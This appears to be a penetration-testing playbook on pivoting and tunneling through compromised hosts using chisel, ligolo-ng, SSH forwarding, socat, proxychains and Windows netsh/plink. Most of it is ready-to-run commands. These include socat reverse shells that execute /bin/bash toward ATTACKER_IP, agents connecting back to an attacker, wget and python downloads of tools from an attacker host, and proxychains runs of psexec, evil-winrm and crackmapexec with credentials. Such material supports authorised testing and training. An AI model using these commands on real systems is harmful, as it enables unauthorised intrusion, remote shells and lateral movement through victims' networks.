# Pivoting & Tunneling Playbook

Techniques for pivoting through compromised hosts to reach internal network segments.

---

## Scenario Quick-Pick

| Goal | Best Tool | Notes |
|------|-----------|-------|
| Full subnet access (transparent) | ligolo-ng | No proxychains needed, TUN-based |
| Single port forward via HTTP | chisel | Works through web proxies |
| SSH available on pivot | SSH -L / -D | No binary upload needed |
| No SSH, relay any TCP | socat | One-liner on pivot |
| Chain multiple proxies | proxychains | Use with any of the above |
| Full VPN-style access | ligolo-ng | Preferred for complex engagements |

---

## 1. Chisel

TCP tunneling over HTTP. Single binary (attacker and target use same binary).

### Setup
```bash
# Download chisel for target arch
# https://github.com/jpillora/chisel/releases
# Transfer to target via wget/curl/scp

# Attacker (server mode)
chisel server -p 8080 --reverse --socks5
# --reverse: allow reverse tunnels from client
# --socks5: enable SOCKS5 proxy on server
```

### Reverse SOCKS5 (most common)
```bash
# Target (client)
./chisel client ATTACKER_IP:8080 R:socks

# Creates SOCKS5 proxy on attacker at 127.0.0.1:1080 (default)
# Configure proxychains: socks5 127.0.0.1 1080

proxychains4 -q nmap -sT -Pn -p 22,80,443,445 INTERNAL_IP
proxychains4 -q curl http://INTERNAL_IP
proxychains4 -q ssh user@INTERNAL_IP
```

### Specific Port Forward (reverse)
```bash
# Expose internal port 80 as local port 8888
./chisel client ATTACKER_IP:8080 R:8888:INTERNAL_IP:80

# Access at: http://127.0.0.1:8888
```

### Forward tunnel (if attacker can reach target directly)
```bash
# Target (client) — forward target's local port to attacker
./chisel client ATTACKER_IP:8080 5432:127.0.0.1:5432
# Attacker can now reach target's PostgreSQL at 127.0.0.1:5432
```

### Multi-hop
```bash
# Hop 1: attacker → pivot1 (already established SOCKS at :1080)
# Hop 2: from pivot1 → pivot2
proxychains4 ./chisel client PIVOT2_IP:8080 R:socks
# New SOCKS at different port: R:1081:socks
```

---

## 2. Ligolo-ng

TUN-based tunneling — creates a virtual network interface on the attacker machine,
giving transparent access to internal networks without proxychains.

### Setup
```bash
# Download both binaries
# https://github.com/nicocha30/ligolo-ng/releases
# proxy  → runs on attacker
# agent  → runs on target (pivot)
```

### Start Proxy (Attacker)
```bash
# Create TUN interface first
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601
# or with real cert: -certfile cert.pem -keyfile key.pem
```

### Deploy Agent (Target/Pivot)
```bash
# Upload and run on target
./agent -connect ATTACKER_IP:11601 -ignore-cert
# or: ./agent -connect ATTACKER_IP:11601 -ignore-cert -retry
```

### Establish Tunnel
```
# In ligolo proxy console:
>> session                    # list available agents
>> [select agent number]
>> ifconfig                   # view target's network interfaces
>> start                      # start tunnel
```

### Add Routes (Attacker)
```bash
# Add route to internal subnet via ligolo interface
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 192.168.100.0/24 dev ligolo

# Now directly access internal hosts:
nmap -sV 10.10.10.5              # no proxychains needed
curl http://192.168.100.10       # direct access
ssh root@10.10.10.5
```

### Listener (Reverse Shell from Internal Host)
```bash
# In ligolo console: add listener on agent to relay back to attacker
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Agent listens on :4444, relays to attacker's :4444
# Trigger reverse shell from internal host pointing to PIVOT_IP:4444
```

### Double Pivot (Three-Hop)
```bash
# Attacker → Pivot1 → Pivot2 → Internal
# 1. Get agent running on Pivot1 → add route to Pivot1's internal subnet
# 2. Deploy agent on Pivot2 through the tunnel
# 3. Add second route: ip route add SUBNET dev ligolo
# 4. Both subnets accessible directly
```

---

## 3. SSH Tunneling

### Local Port Forward
Makes a remote service accessible on attacker's localhost.
```bash
# Access PIVOT's internal service locally
ssh -L LOCAL_PORT:INTERNAL_HOST:REMOTE_PORT user@PIVOT_IP

# Examples:
ssh -L 8080:10.10.10.5:80 user@PIVOT      # internal web
ssh -L 5432:127.0.0.1:5432 user@PIVOT     # pivot's own Postgres
ssh -L 3389:INTERNAL_DC:3389 user@PIVOT   # internal RDP

# Connect: http://127.0.0.1:8080 → reaches 10.10.10.5:80 via PIVOT
```

### Remote Port Forward
Exposes attacker's service on the pivot (useful for reverse shells through firewall).
```bash
# Make attacker's listener accessible on PIVOT
ssh -R PIVOT_PORT:127.0.0.1:ATTACKER_PORT user@PIVOT

# Example: attacker's nc listener on 4444, expose as pivot's :4444
ssh -R 4444:127.0.0.1:4444 user@PIVOT
# Internal hosts can reverse shell to PIVOT_IP:4444 → reaches attacker
```

### Dynamic SOCKS Proxy
```bash
# Create SOCKS5 proxy through SSH
ssh -D 1080 user@PIVOT              # interactive
ssh -fNT -D 1080 user@PIVOT         # background, no command

# Use with proxychains: socks5 127.0.0.1 1080
proxychains4 -q nmap -sT -Pn INTERNAL_IP
```

### ProxyJump (Multi-hop SSH)
```bash
# Single command through pivot
ssh -J user@PIVOT user@INTERNAL_IP

# Chain multiple hops
ssh -J user@PIVOT1,user@PIVOT2 user@FINAL_TARGET

# SCP through jump
scp -J user@PIVOT local_file user@INTERNAL_IP:/tmp/
```

### SSH Without PTY (for scripting)
```bash
# Tunnel only, no shell
ssh -fNT -L 8080:INTERNAL:80 user@PIVOT
# -f = background, -N = no command, -T = no TTY allocation
```

---

## 4. Socat

Swiss-army relay tool. Often already on target.

### TCP Relay (Pivot)
```bash
# On pivot: relay port 4444 to attacker:4444
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444
# Target reverse shells to PIVOT:4444 → attacker receives

# Or: relay to internal service
socat TCP-LISTEN:8080,fork TCP:INTERNAL_IP:80
```

### Bind Shell Relay
```bash
# On pivot: expose attacker's shell listener to internal network
socat TCP-LISTEN:9999,reuseaddr,fork TCP:ATTACKER_IP:4444
# Internal host connects to PIVOT:9999 → attacker's listener on 4444
```

### PTY Upgrade (Stable Shell)
```bash
# Attacker listens with socat for PTY shell
socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT

# Target sends PTY shell (must have socat)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER_IP:PORT
```

### UDP Tunnel
```bash
socat UDP-LISTEN:53,fork TCP:ATTACKER_IP:4444   # DNS port tunnel
```

### TLS Encrypted Relay
```bash
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem

# Attacker listens encrypted
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0 -

# Target connects encrypted
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash
```

---

## 5. Proxychains Configuration

### /etc/proxychains4.conf
```ini
# Strict chain: all proxies must be up
strict_chain
# Dynamic: skip dead proxies (better for chaining)
# dynamic_chain

proxy_dns    # resolve DNS through proxy

[ProxyList]
socks5 127.0.0.1 1080    # chisel / SSH dynamic
# socks4 127.0.0.1 1080
# http   127.0.0.1 8080
```

### Usage
```bash
proxychains4 nmap -sT -Pn -p 22,80,443,445,3389,8080 INTERNAL_IP
proxychains4 -q curl http://INTERNAL_IP    # -q quiet mode
proxychains4 ssh user@INTERNAL_IP
proxychains4 evil-winrm -i INTERNAL_IP -u admin -p pass
proxychains4 impacket-psexec domain/user:pass@INTERNAL_IP
proxychains4 crackmapexec smb 10.10.10.0/24 -u user -p pass
```

### nmap Through Proxy (Limitations)
- TCP connect scan only (`-sT`), no SYN scan
- `-Pn` required (ICMP won't work through SOCKS)
- Slow — use smaller port ranges

---

## 6. Windows Pivot Techniques

### netsh Port Proxy (Windows Pivot, admin required)
```cmd
# Forward external port to internal host
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP

# View
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080
```

### plink.exe (PuTTY SSH client for Windows)
```cmd
# Dynamic SOCKS proxy from Windows to attacker's SSH
plink.exe -ssh -D 1080 user@ATTACKER_IP -pw password

# Remote forward (expose Windows port on attacker)
plink.exe -ssh -R 8080:127.0.0.1:80 user@ATTACKER_IP
```

### chisel on Windows
```powershell
# Same syntax as Linux
.\chisel.exe client ATTACKER_IP:8080 R:socks
```

---

## 7. Port Forwarding Pattern Reference

| Scenario | Tool | Command |
|----------|------|---------|
| Access internal web | SSH local | `ssh -L 8080:INTERNAL:80 user@PIVOT` |
| Access internal DB | SSH local | `ssh -L 5432:127.0.0.1:5432 user@PIVOT` |
| Reverse shell through firewall | SSH remote | `ssh -R 4444:127.0.0.1:4444 user@PIVOT` |
| Full subnet transparent access | ligolo-ng | `ip route add SUBNET dev ligolo` |
| SOCKS for proxychains | SSH dynamic | `ssh -D 1080 user@PIVOT` |
| HTTP-based tunnel | chisel | `chisel server --reverse + client R:socks` |
| Quick TCP relay | socat | `socat TCP-LISTEN:PORT,fork TCP:DEST:PORT` |
| Windows portfwd | netsh | `netsh portproxy add v4tov4 ...` |
| Multi-hop SSH | ProxyJump | `ssh -J PIVOT1,PIVOT2 user@TARGET` |

---

## 8. File Transfer to Pivot (Without Tools)

```bash
# Base64 encode file, paste in shell
base64 chisel_linux > /tmp/chisel.b64
# On target shell:
cat > /tmp/chisel.b64 << 'EOF'
[paste base64]
EOF
base64 -d /tmp/chisel.b64 > /tmp/chisel && chmod +x /tmp/chisel

# Python upload (if Python + internet access on pivot)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER/chisel', '/tmp/chisel')"

# wget / curl if available
wget http://ATTACKER:8080/chisel -O /tmp/chisel

# SCP if SSH
scp user@PIVOT:/tmp/ ./chisel
```
